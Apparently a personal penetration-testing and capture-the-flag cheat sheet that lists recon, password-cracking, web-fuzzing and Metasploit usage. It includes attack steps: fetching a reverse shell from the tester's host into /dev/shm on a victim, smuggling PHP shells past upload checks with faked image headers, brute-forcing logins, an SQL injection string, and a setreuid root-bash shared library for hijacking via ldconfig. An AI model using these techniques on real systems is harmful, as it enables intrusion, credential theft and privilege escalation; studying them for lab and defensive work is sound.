Binary analysis
---------------
binwalk, xxd, hexdump, obnjdump, radare2, strings
exiftool - inspect image
ldd - list all linked libraries
ldconfig - configure dynamic run time linker (/etc/ld.so.conf.d)
    - configures the location of dynamic libraries to look at
    - we can change the dynamic library binding by manipulating the binding path

Radare2
-------
a - analyze
aaa
afl - list functions
a? - get options for analyze
pdf @ main - print-disassemble-function main
pdc @ main - print-disass-C-like-decompile


Reckon tools
------------

- nmap -sC -sV -oA nmap <IP>
- dirb
    This tool enumerates url paths based on a wordlist
- dirbuster
- gobuster -u <URL> -w <path-to-worldlistfile> -o <outputfile>

- Worldlists:
    - /usr/share/wordlists/ on Kali
    - `cewl` -> worlist generator based on spidering a website, wordlist can be used for john the ripper

- Burp Suite - get the Firefox plugin FoxyProxy to use it
    Proxy, Repeater (ctrl+r to send a capture to the repeater)

- joomscan: Joomla vulnerability scanner

- LinEnum: enumerate Linux vulnerablities #nice
    https://github.com/rebootuser/LinEnum.git
    - /opt/LinEnum/LinEnum.sh
        You can just spawn a simple HTTPServer on your pentest box and curl the script into the
            victim's machine


Password Cracking
-----------------
If we have let's say an MD5 hash of a password we can use hashcat to try to crack it. Plus
we need a wordlist, like rockyou.txt

- john: John the Ripper
- cewl - to generate wordlist
- hashcat
- hydra, hydra-gtk

Metasploit
----------

- msfconsole
- msfdb run

Commands:
    - search progname
    - use <modulename>
    - info
    - show options
    - set RHOSTS 10.10.10.134
    - run


pwntools
--------

python library for CTF and hacking.

Web Application hacking
-----------------------

When filling out web forms we can capture that request with Burp.
Then copy the request to a file and use sqlmap to try and to sql injection.
For instance we try a login form, capture that and copy the request to login.req.

`sqlmap -r login.req --level 5 --risk 3`

- File upload explotiation is something should try first.
   Once we uploaded a file, we should guess the location of it by enumerating folders.
    Usually **/uploads or **/upload 
    
  File types to upload:
    - php scripts! They can give you a reverse shell. There is some github project
        which hosts php-reverse-shell.php or something like this. Of course
        it only works if the web app is coded in php. 
    - Usually app will check if the uploaded file is the type it expects(ie image, PNG, JPEG etc)
        We can fool it by setting http header Content-Type: image/png and also by prepending
        our php code with some PNG start bytes, so if Linux runs `file` on it, it will be
        fooled into believing it is image. (file checks the magic bytes)
        Note that Web App Firewalls will inspect the POST data much more deeply and will
           recognize that we try something fishy.
    - Reverse shell file upload


Web App Fuzzing
---------------
### wfuzz - Web app fuzzer !!! #nice 

    `wfuzz -c --hw 36 -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -d 'username=admin&password=FUZZ&submit=login' <URL>`

    The above wfuzz command will take every item from the above wordlist and subsitute with FUZZ.
    -d 'PAYLOAD' -> grab it via Burp, see what POST body is sent

    We can also fuzz cookies in the header for example. Not just the body.
      
    `wfuzz -c --hw 29 -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -H 'Cookie:password=FUZZ' <URL>`

We can also put the FUZZ into the URL param list!

/usr/share/seclists/Fuzzing




Security dumps, files, wordlists
--------------------------------

SecLists - Password dumps etc.
https://github.com/danielmiessler/SecLists
Kali: apt -y install seclists
    - /usr/share/seclists/

/usr/share/wordlists/rockyou.txt - 134MB file - over 14 million passwords


Burp Suite
----------

Add to scope the site you care about and remove from scope all the other unrelated sites.
Do the same in the HTTP History tab under the Proxy tab.

- Repeater tab:
    - We can change the request method to POST from GET and vica versa
    - Can do conversions, url encoding etc


SQL Injection
-------------

Examples:
   ' or '1'='1

Applications:
    - sqlmap
    

Misc
----

base64  
    this program can encode/decode to/from base64 encoding
    `echo <base64-encoded-string> | base64 -d`

`find /home -type f -printf "%f\t%p\t%u\t%g\t%m" -maxdepth=2`
    Print files, and print different properties of the files to a certain depth.

`dpkg -l` | grep -i <name-of-package-of-interest>
    dpkg -l: will list all the installed software packages
    

Exploit tools
-------------

- searchsploit
    Searches exploitdb to look for exploits for a given application version.
    searchsploit -x 11746.txt to open the exploit

Reverse shells
--------------
- reverse shells:
    - python-pty-shells: just google it on GitHub:
        tcp_pty_backconnect.py

stty raw -echo

Injectable Web Exploit Code: /usr/share/laudanum/README   -- make sure to use this!!

- python2 -m SimpleHTTPServer
- python3 -m http.server
    These will spawn a simple webservers. This will allow us to download stuff from our machine to
        the machine where we placed the code executor php file. Just do a code execution of 
                wget <OUR-IP>:8000/tcp_pty_backconnect.py -O /dev/shm/.reverse_shell.py
        It is good practice to save a reverse shell to /dev/shm so it will not be saved to hard drive.

- `nc -nlvp <PORT>` to set up a listen "server" to accept incoming connections

- Once we uploaded the reverse shell using our simple http server, we do
      python tcp_pty_shell_handler.py -b <IP>:<PORT>
        then we execute the reverse shell on the remote machine and we get the shell.

Vulnerabilities
---------------

Old linux kernel - DIRTY COW exploitable
MOTD - PAM - Pluggable Authentication Module (searchsploit motd)

DNS
---
Tools:
    - nslookup, dig, dnsrecon

Usually on port 53 and UDP. If TCP then probably dns zone transfer is enabled.
    `dig axfr @<dnsserverIP>` - does zone transfer

```
$nslookup
> Server 10.10.10.29
Default server: 10.10.10.29
Address: 10.10.10.29#53
> 127.0.0.1
> 10.10.10.29
```

Documentation tool
------------------

- CherryTree
    Very good at taking notes and organize in a hierarchical way.
    
    C-n: new node
    C-S-n: new child node

Bash
----
https://www.linux.com/learn/intro-to-linux/2017/4/fabulous-bash-navigation-shortcuts
https://www.ostechnix.com/list-useful-bash-keyboard-shortcuts/
history: get the command history
ctrl-u: clear stuff before cursor
ctrl-c: erase the command
ctrl-r: search history backward
ctrl-s: search histroy forward
ctrl-g: leave history mode
ctrl-e: go to end
ctrl-a: go to beginning
ctrl-p: prev command
ctrl-n: next command
alt-b: move bach one word
alt-f: move forward one word

tmux shortcuts
--------------

C-b + n : next tab
C-b + p : prev tab
C-b + % : split tab vertically
C-b + " : split tab horizontally
C-b + , : rename tab
C-b + x : kill tab
C-b + [ : to escape the command line and scroll into the results

python
======

navigate back and forth with C+p and C+n to get prev, next command
Better to use ipython for code completion

awk
===

https://stackoverflow.com/questions/450799/shell-command-to-sum-integers-one-per-line
https://likegeeks.com/awk-command/

Sum numbers on each line the first element and save to file
    awk '{s+=$1} END {print s}' mydatafile


requests
--------
```
import requests
response = requests.get(url)  # GET request
reponse.text                  # grab the body
response = requests.head(url) # HEAD request
response.headers              # grab the headers
dir(response)                 # see what data, methods we have on this object

```

Virtual Host Routing
--------------------

Request going to the same IP but with different Host http header field will get routed to different
web sites.



Binary hacking
==============

1. Hijacking dynamic function calls #nice
    we can change the dynamic library path using ldconfig. Write our own lib with
        a hijacked function in it. For example our own printf. Then running ldconfig will
        point the executables to load our new library at run time. 
        Dynamic loader config is at: /etc/ld.so.conf.d/ and just create a new file with
        a folder in it where you have your own hijacker library with printf redefined.

    
Bash in C
---------
With root priviliges:
```
#include <stdlib.h>
extern int bash();

int bash() {
    setreuid(0, 0);
    execve("/bin/bash", NULL, NULL);
}
```

gcc
---

Sharedlib:
    gcc -shared -fPIC -o libbash.so bash.c
